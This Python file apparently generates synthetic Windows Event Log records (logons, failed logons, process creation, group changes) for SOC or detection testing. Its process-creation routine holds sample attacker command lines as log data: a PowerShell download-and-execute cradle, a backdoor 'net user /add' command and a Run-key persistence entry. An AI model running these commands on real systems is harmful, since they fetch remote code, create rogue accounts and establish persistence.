#!/usr/bin/env python3
"""
Windows Event Log Generator

Generates realistic Windows Event Log entries including:
- Security logs (logon events, process creation, privilege escalation)
- System logs (service events, driver loading)
- Application logs (application errors, crashes)

Output formats supported:
- Windows Event Log XML format
- JSON (ECS compatible)
- Raw event data

Reference: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-auditing-faq
"""

import json
import random
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

try:
    from ...core import LogEvent, EventSeverity, AssetInventory
    from ..base import BaseGenerator
except (ImportError, ValueError):
    from core import LogEvent, EventSeverity, AssetInventory
    from generators.base import BaseGenerator


class WindowsEventGenerator(BaseGenerator):
    """
    Generator for Windows Event Logs (Security, System, Application channels).
    
    Generates realistic Windows events with proper field mappings and
    correlation between related events (e.g., logon sessions).
    """
    
    # Windows Event IDs for SOC-relevant events
    SECURITY_EVENTS = {
        # Logon/Logoff Events
        4624: ("An account was successfully logged on", "Success", EventSeverity.LOW),
        4625: ("An account failed to log on", "Failure", EventSeverity.MEDIUM),
        4634: ("An account was logged off", "Success", EventSeverity.LOW),
        4648: ("A logon was attempted using explicit credentials", "Success", EventSeverity.MEDIUM),
        4647: ("User initiated logoff", "Success", EventSeverity.LOW),
        4778: ("A session was reconnected to a Window Station", "Success", EventSeverity.LOW),
        4779: ("A session was disconnected from a Window Station", "Success", EventSeverity.LOW),
        
        # Privilege Escalation
        4672: ("Special privileges assigned to new logon", "Success", EventSeverity.MEDIUM),
        4673: ("A privileged service was called", "Failure", EventSeverity.HIGH),
        4674: ("An operation was attempted on a privileged object", "Failure", EventSeverity.HIGH),
        
        # Process Events
        4688: ("A new process has been created", "Success", EventSeverity.LOW),
        4689: ("A process has exited", "Success", EventSeverity.LOW),
        4696: ("A primary token was assigned to process", "Success", EventSeverity.MEDIUM),
        
        # Account Management
        4720: ("A user account was created", "Success", EventSeverity.HIGH),
        4722: ("A user account was enabled", "Success", EventSeverity.HIGH),
        4723: ("An attempt was made to change an account's password", "Success", EventSeverity.MEDIUM),
        4724: ("An attempt was made to reset an account's password", "Success", EventSeverity.MEDIUM),
        4725: ("A user account was disabled", "Success", EventSeverity.MEDIUM),
        4726: ("A user account was deleted", "Success", EventSeverity.HIGH),
        4738: ("A user account was changed", "Success", EventSeverity.MEDIUM),
        4740: ("A user account was locked out", "Failure", EventSeverity.MEDIUM),
        
        # Group Management
        4727: ("A security-enabled global group was created", "Success", EventSeverity.HIGH),
        4728: ("A member was added to a security-enabled global group", "Success", EventSeverity.CRITICAL),
        4729: ("A member was removed from a security-enabled global group", "Success", EventSeverity.HIGH),
        4732: ("A member was added to a security-enabled local group", "Success", EventSeverity.HIGH),
        4733: ("A member was removed from a security-enabled local group", "Success", EventSeverity.HIGH),
        4756: ("A member was added to a security-enabled universal group", "Success", EventSeverity.HIGH),
        
        # Kerberos Events
        4768: ("A Kerberos authentication ticket (TGT) was requested", "Success", EventSeverity.LOW),
        4769: ("A Kerberos service ticket was requested", "Success", EventSeverity.LOW),
        4771: ("Kerberos pre-authentication failed", "Failure", EventSeverity.MEDIUM),
        4772: ("A Kerberos authentication ticket request failed", "Failure", EventSeverity.MEDIUM),
        4776: ("The computer attempted to validate credentials", "Success", EventSeverity.LOW),
        
        # Object Access
        4661: ("A handle to an object was requested", "Success", EventSeverity.LOW),
        4662: ("An operation was performed on an object", "Success", EventSeverity.LOW),
        4663: ("An attempt was made to access an object", "Success", EventSeverity.LOW),
        4664: ("An attempt was made to create a hard link", "Success", EventSeverity.LOW),
        
        # Policy Change
        4719: ("System audit policy was changed", "Success", EventSeverity.CRITICAL),
        4739: ("Domain Policy was changed", "Success", EventSeverity.HIGH),
        4912: ("Per User Audit Policy was changed", "Success", EventSeverity.HIGH),
        
        # Sensitive Privilege Use
        4673: ("A privileged service was called", "Failure", EventSeverity.HIGH),
        4674: ("An operation was attempted on a privileged object", "Failure", EventSeverity.HIGH),
    }
    
    SYSTEM_EVENTS = {
        7036: ("The %1 service entered the %2 state", "INFO", EventSeverity.LOW),
        7034: ("The %1 service terminated unexpectedly", "ERROR", EventSeverity.HIGH),
        7040: ("The start type of the %1 service was changed", "WARNING", EventSeverity.MEDIUM),
        6005: ("The Event log service was started", "INFO", EventSeverity.LOW),
        6006: ("The Event log service was stopped", "INFO", EventSeverity.LOW),
        6008: ("The previous system shutdown was unexpected", "ERROR", EventSeverity.HIGH),
        1074: ("The process %1 has initiated the restart of computer %2", "INFO", EventSeverity.LOW),
        1076: ("The reason supplied by user %1 for the last unexpected shutdown", "INFO", EventSeverity.LOW),
    }
    
    # Logon types
    LOGON_TYPES = {
        2: "Interactive",
        3: "Network",
        4: "Batch",
        5: "Service",
        7: "Unlock",
        8: "NetworkCleartext",
        9: "NewCredentials",
        10: "RemoteInteractive",
        11: "CachedInteractive"
    }
    
    # Common Windows processes
    COMMON_PROCESSES = [
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "Microsoft Corporation"),
        ("lsass.exe", "C:\\Windows\\System32\\lsass.exe", "Microsoft Corporation"),
        ("services.exe", "C:\\Windows\\System32\\services.exe", "Microsoft Corporation"),
        ("explorer.exe", "C:\\Windows\\explorer.exe", "Microsoft Corporation"),
        ("winlogon.exe", "C:\\Windows\\System32\\winlogon.exe", "Microsoft Corporation"),
        ("csrss.exe", "C:\\Windows\\System32\\csrss.exe", "Microsoft Corporation"),
        ("smss.exe", "C:\\Windows\\System32\\smss.exe", "Microsoft Corporation"),
        ("wininit.exe", "C:\\Windows\\System32\\wininit.exe", "Microsoft Corporation"),
        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Google LLC"),
        ("firefox.exe", "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "Mozilla Corporation"),
        ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "Microsoft Corporation"),
        ("winword.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Microsoft Corporation"),
        ("excel.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "Microsoft Corporation"),
        ("teams.exe", "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", "Microsoft Corporation"),
    ]
    
    # Potentially suspicious processes
    SUSPICIOUS_PROCESSES = [
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Microsoft Corporation"),
        ("cmd.exe", "C:\\Windows\\System32\\cmd.exe", "Microsoft Corporation"),
        ("wscript.exe", "C:\\Windows\\System32\\wscript.exe", "Microsoft Corporation"),
        ("cscript.exe", "C:\\Windows\\System32\\cscript.exe", "Microsoft Corporation"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "Microsoft Corporation"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "Microsoft Corporation"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "Microsoft Corporation"),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "Microsoft Corporation"),
        ("bitsadmin.exe", "C:\\Windows\\System32\\bitsadmin.exe", "Microsoft Corporation"),
    ]
    
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        super().__init__(config)
        self.inventory = inventory
        self.channels = config.get('channels', ['Security', 'System'])
        self.channel_weights = config.get('channel_weights', [70, 30])
        self.security_event_weights = config.get('security_event_weights', None)
        
        # Track active logon sessions for correlation
        self.active_sessions: Dict[str, Dict] = {}
    
    def _get_random_windows_asset(self) -> Dict[str, Any]:
        """Get a random Windows workstation or server."""
        workstations = {k: v for k, v in self.inventory.assets.items() 
                       if v.get("type") == "workstation" or 
                       (v.get("type") == "server" and "Windows" in v.get("os", ""))}
        if not workstations:
            return {"hostname": "WK-WIN-001", "ip": "10.0.10.11", "domain": "corp.local"}
        hostname = random.choice(list(workstations.keys()))
        asset = workstations[hostname].copy()
        asset["hostname"] = hostname
        return asset
    
    def _generate_logon_id(self) -> str:
        """Generate a Windows logon ID (hex)."""
        return "0x" + "".join([random.choice("0123456789ABCDEF") for _ in range(8)])
    
    def _generate_sid(self, domain: str = "corp", user: str = None) -> str:
        """Generate a Windows Security ID (SID)."""
        if user is None:
            user = random.choice(self.inventory.users)["username"]
        rid = random.randint(1000, 9999)
        return f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{rid}"
    
    def _generate_security_event_4624(self, asset: Dict) -> LogEvent:
        """Generate Event ID 4624: Successful logon."""
        user = self.inventory.get_random_user()
        logon_type = random.choices(
            list(self.LOGON_TYPES.keys()),
            weights=[10, 50, 5, 15, 5, 2, 3, 8, 2]
        )[0]
        
        # Source IP depends on logon type
        if logon_type in [3, 8, 10]:  # Network/Remote
            if random.random() < 0.3:
                src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            else:
                src_asset = self.inventory.get_random_asset()
                src_ip = src_asset["ip"]
        else:
            src_ip = asset["ip"]
        
        logon_id = self._generate_logon_id()
        subject_user = "SYSTEM" if random.random() < 0.3 else user["username"]
        
        # Track session
        session_key = f"{asset['hostname']}_{logon_id}"
        self.active_sessions[session_key] = {
            "username": user["username"],
            "logon_type": logon_type,
            "logon_time": datetime.now(timezone.utc),
            "ip": src_ip
        }
        
        fields = {
            "EventID": 4624,
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserSid": self._generate_sid(user=subject_user),
            "SubjectUserName": subject_user,
            "SubjectDomainName": user["domain"],
            "TargetUserSid": self._generate_sid(user=user["username"]),
            "TargetUserName": user["username"],
            "TargetDomainName": user["domain"],
            "TargetLogonId": logon_id,
            "LogonType": logon_type,
            "LogonTypeName": self.LOGON_TYPES[logon_type],
            "IpAddress": src_ip,
            "IpPort": random.randint(1024, 65535) if logon_type in [3, 10] else "-",
            "ProcessName": "C:\\Windows\\System32\\svchost.exe" if logon_type == 5 else "C:\\Windows\\System32\\winlogon.exe",
            "Status": "0x0",
            "SubStatus": "0x0",
            "AuthenticationPackageName": "NTLM" if random.random() < 0.3 else "Kerberos",
            "LmPackageName": "-",
            "KeyLength": 0,
            "ProcessId": random.randint(100, 9999),
            "TransmittedServices": "-",
        }
        
        msg = f"An account was successfully logged on. User: {user['username']} Type: {self.LOGON_TYPES[logon_type]} From: {src_ip}"
        
        return LogEvent(
            timestamp=datetime.now(timezone.utc),
            source_type="windows",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=self._to_xml(4624, msg, fields),
            fields=fields,
            tags=["windows", "security", "logon", f"logon_type_{logon_type}"],
            severity=EventSeverity.LOW
        )
    
    def _generate_security_event_4625(self, asset: Dict) -> LogEvent:
        """Generate Event ID 4625: Failed logon (brute force detection)."""
        user = self.inventory.get_random_user()
        logon_type = random.choice([2, 3, 10])
        
        # External IPs for failed attempts
        src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Random failure status
        failure_reasons = {
            "0xC000006D": "Unknown user name or bad password",
            "0xC000006E": "User account restricted",
            "0xC000006F": "Account logon time restriction violation",
            "0xC0000070": "Account currently disabled",
            "0xC0000071": "Account expired",
            "0xC0000072": "User not allowed to logon at this computer",
            "0xC0000193": "Account expired"
        }
        status = random.choice(list(failure_reasons.keys()))
        
        fields = {
            "EventID": 4625,
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserSid": self._generate_sid(user="SYSTEM"),
            "SubjectUserName": "SYSTEM",
            "SubjectDomainName": "NT AUTHORITY",
            "TargetUserSid": self._generate_sid(user=user["username"]),
            "TargetUserName": user["username"],
            "TargetDomainName": user["domain"],
            "Status": status,
            "FailureReason": failure_reasons[status],
            "SubStatus": "0x0",
            "LogonType": logon_type,
            "LogonProcessName": "NtLmSsp",
            "AuthenticationPackageName": "NTLM",
            "WorkstationName": f"WK-{random.randint(100, 999)}",
            "TransmittedServices": "-",
            "LmPackageName": "-",
            "KeyLength": 0,
            "ProcessId": "0x0",
            "ProcessName": "-",
            "IpAddress": src_ip,
            "IpPort": random.randint(10000, 65000),
        }
        
        msg = f"An account failed to log on. User: {user['username']} Reason: {failure_reasons[status]} From: {src_ip}"
        
        return LogEvent(
            timestamp=datetime.now(timezone.utc),
            source_type="windows",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=self._to_xml(4625, msg, fields),
            fields=fields,
            tags=["windows", "security", "logon_failure", "brute_force"],
            severity=EventSeverity.HIGH
        )
    
    def _generate_security_event_4688(self, asset: Dict) -> LogEvent:
        """Generate Event ID 4688: Process creation."""
        user = self.inventory.get_random_user()
        
        # Mix of common and suspicious processes
        if random.random() < 0.15:  # 15% suspicious
            proc_name, proc_path, company = random.choice(self.SUSPICIOUS_PROCESSES)
            is_suspicious = True
            
            # Suspicious command lines
            cmd_lines = [
                f'{proc_path} -enc UEsDBBQAAAAIACBT',
                f'{proc_path} /c whoami > %temp%\\out.txt',
                f'{proc_path} -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.100/run.ps1\')"',
                f'{proc_path} /c net user admin P@ssw0rd /add',
                f'{proc_path} /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "C:\\temp\\update.exe" /f',
            ]
            cmd_line = random.choice(cmd_lines)
            severity = EventSeverity.HIGH
            tags = ["windows", "security", "process_create", "suspicious"]
        else:
            proc_name, proc_path, company = random.choice(self.COMMON_PROCESSES)
            is_suspicious = False
            cmd_line = proc_path
            severity = EventSeverity.LOW
            tags = ["windows", "security", "process_create"]
        
        fields = {
            "EventID": 4688,
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserSid": self._generate_sid(user=user["username"]),
            "SubjectUserName": user["username"],
            "SubjectDomainName": user["domain"],
            "SubjectLogonId": self._generate_logon_id(),
            "NewProcessId": hex(random.randint(1000, 65535)),
            "NewProcessName": proc_path,
            "ProcessName": proc_name,
            "CommandLine": cmd_line,
            "TokenElevationType": random.choice(["TokenElevationTypeDefault", "TokenElevationTypeFull", "TokenElevationTypeLimited"]),
            "ProcessTokenSid": self._generate_sid(),
            "MandatoryLabel": "S-1-16-12288" if "Full" in cmd_line or is_suspicious else "S-1-16-8192",
            "CreatorProcessId": random.randint(400, 9999),
            "CreatorProcessName": "C:\\Windows\\explorer.exe" if user["role"] == "user" else "C:\\Windows\\System32\\services.exe",
            "ProcessCheckSum": hex(random.randint(0x10000000, 0xFFFFFFFF)),
            "ParentProcessCheckSum": hex(random.randint(0x10000000, 0xFFFFFFFF)),
        }
        
        msg = f"A new process has been created. Process: {proc_name} User: {user['username']}"
        if is_suspicious:
            msg += f" [SUSPICIOUS: {cmd_line[:50]}...]"
        
        return LogEvent(
            timestamp=datetime.now(timezone.utc),
            source_type="windows",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=self._to_xml(4688, msg, fields),
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_security_event_4728(self, asset: Dict) -> LogEvent:
        """Generate Event ID 4728: Member added to security group."""
        user = self.inventory.get_random_user()
        
        # Groups
        groups = [
            ("Domain Admins", "Domain", "Critical"),
            ("Enterprise Admins", "Domain", "Critical"),
            ("Administrators", "Builtin", "High"),
            ("Backup Operators", "Builtin", "High"),
            ("Account Operators", "Builtin", "High"),
            ("Server Operators", "Builtin", "High"),
        ]
        group_name, group_domain, impact = random.choice(groups)
        
        # Target user
        target_user = self.inventory.get_random_user()
        
        fields = {
            "EventID": 4728,
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserSid": self._generate_sid(user=user["username"]),
            "SubjectUserName": user["username"],
            "SubjectDomainName": user["domain"],
            "SubjectLogonId": self._generate_logon_id(),
            "MemberSid": self._generate_sid(user=target_user["username"]),
            "MemberName": target_user["username"],
            "MemberDomainName": target_user["domain"],
            "TargetUserName": group_name,
            "TargetDomainName": group_domain,
            "TargetSid": self._generate_sid(),
            "PrivilegeList": "-",
        }
        
        msg = f"A member was added to a security-enabled global group. Group: {group_name} Member: {target_user['username']} By: {user['username']}"
        
        return LogEvent(
            timestamp=datetime.now(timezone.utc),
            source_type="windows",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=self._to_xml(4728, msg, fields),
            fields=fields,
            tags=["windows", "security", "group_change", "privilege_escalation"],
            severity=EventSeverity.CRITICAL if impact == "Critical" else EventSeverity.HIGH
        )
    
    def _generate_system_event(self, asset: Dict) -> LogEvent:
        """Generate a System channel event."""
        event_id = random.choice(list(self.SYSTEM_EVENTS.keys()))
        msg_template, level, severity = self.SYSTEM_EVENTS[event_id]
        
        # Service names
        services = [
            "Windows Update", "Background Intelligent Transfer Service", "DHCP Client",
            "DNS Client", "Workstation", "Server", "Print Spooler", "Windows Defender",
            "SQL Server", "IIS Admin Service", "World Wide Web Publishing Service"
        ]
        states = ["running", "stopped", "start pending", "stop pending", "paused"]
        
        service = random.choice(services)
        state = random.choice(states)
        
        msg = msg_template.replace("%1", service).replace("%2", state)
        
        fields = {
            "EventID": event_id,
            "Channel": "System",
            "Provider": "Service Control Manager" if event_id in [7036, 7034, 7040] else "EventLog",
            "Level": level,
            "ServiceName": service,
            "State": state if event_id == 7036 else None,
            "PreviousStartType": "Auto" if event_id == 7040 else None,
            "NewStartType": "Manual" if event_id == 7040 else None,
        }
        
        return LogEvent(
            timestamp=datetime.now(timezone.utc),
            source_type="windows",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=self._to_xml(event_id, msg, fields),
            fields=fields,
            tags=["windows", "system"],
            severity=severity
        )
    
    def _to_xml(self, event_id: int, message: str, fields: Dict) -> str:
        """Convert event fields to Windows Event Log XML format."""
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        
        xml = f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        xml += f'  <System>\n'
        xml += f'    <Provider Name="{fields.get("Provider", "Microsoft-Windows-Security-Auditing")}" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}"/>\n'
        xml += f'    <EventID>{event_id}</EventID>\n'
        xml += f'    <Version>0</Version>\n'
        xml += f'    <Level>0</Level>\n'
        xml += f'    <Task>0</Task>\n'
        xml += f'    <Opcode>0</Opcode>\n'
        xml += f'    <Keywords>0x8020000000000000</Keywords>\n'
        xml += f'    <TimeCreated SystemTime="{ts}"/>\n'
        xml += f'    <EventRecordID>{random.randint(1000000, 9999999)}</EventRecordID>\n'
        xml += f'    <Channel>{fields.get("Channel", "Security")}</Channel>\n'
        xml += f'    <Computer>{fields.get("Computer", "WK-WIN-001")}</Computer>\n'
        xml += f'  </System>\n'
        xml += f'  <EventData>\n'
        
        for key, value in fields.items():
            if key not in ["Channel", "Provider", "Computer"] and value is not None:
                xml += f'    <Data Name="{key}">{value}</Data>\n'
        
        xml += f'  </EventData>\n'
        xml += f'</Event>'
        
        return xml
    
    def generate_event(self) -> LogEvent:
        """Generate a Windows event based on configured distribution."""
        channel = random.choices(self.channels, weights=self.channel_weights)[0]
        
        asset = self._get_random_windows_asset()
        
        if channel == "Security":
            # Weight security events
            if self.security_event_weights:
                event_id = random.choices(
                    list(self.SECURITY_EVENTS.keys()),
                    weights=self.security_event_weights
                )[0]
            else:
                # Just pick randomly without weights for now
                event_id = random.choice(list(self.SECURITY_EVENTS.keys()))
            
            # Route to specific generator
            if event_id == 4624:
                return self._generate_security_event_4624(asset)
            elif event_id == 4625:
                return self._generate_security_event_4625(asset)
            elif event_id == 4688:
                return self._generate_security_event_4688(asset)
            elif event_id == 4728:
                return self._generate_security_event_4728(asset)
            else:
                # Generic security event
                desc, status, severity = self.SECURITY_EVENTS[event_id]
                return LogEvent(
                    timestamp=datetime.now(timezone.utc),
                    source_type="windows",
                    source_ip=asset["ip"],
                    source_host=asset["hostname"],
                    message=desc,
                    raw_log=f"EventID={event_id}: {desc}",
                    fields={"EventID": event_id, "Channel": "Security"},
                    tags=["windows", "security"],
                    severity=severity
                )
        
        elif channel == "System":
            return self._generate_system_event(asset)
        
        else:  # Application
            return LogEvent(
                timestamp=datetime.now(timezone.utc),
                source_type="windows",
                source_ip=asset["ip"],
                source_host=asset["hostname"],
                message="Application event",
                raw_log="Application: Event logged",
                fields={"Channel": "Application"},
                tags=["windows", "application"],
                severity=EventSeverity.LOW
            )
